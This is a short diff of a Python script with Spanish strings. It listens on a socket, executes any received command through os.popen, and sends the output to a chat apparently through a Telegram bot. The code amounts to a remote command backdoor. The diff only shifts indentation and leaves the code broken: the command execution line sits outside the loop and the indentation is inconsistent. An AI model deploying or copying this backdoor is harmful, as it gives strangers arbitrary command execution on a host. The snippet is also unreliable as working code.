@@ -13,14 +13,14 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((ip, puerto))
 s.listen(1)
 while True:
-    conn, addr = s.accept()
-    cmd = conn.recv(1024)
+        conn, addr = s.accept()
+        cmd = conn.recv(1024)
 print(" Comando: " + cmd)
-    out = os.popen(cmd).read()
+out = os.popen(cmd).read()
 if out != "":
-    bot.send_message(cid, "Resultado: " + out)
+        bot.send_message(cid, "Resultado: " + out)
 else:
-    bot.send_message(cid, "¡¡Comando sin salida!!")
+        bot.send_message(cid, "¡¡Comando sin salida!!")
 
 
 
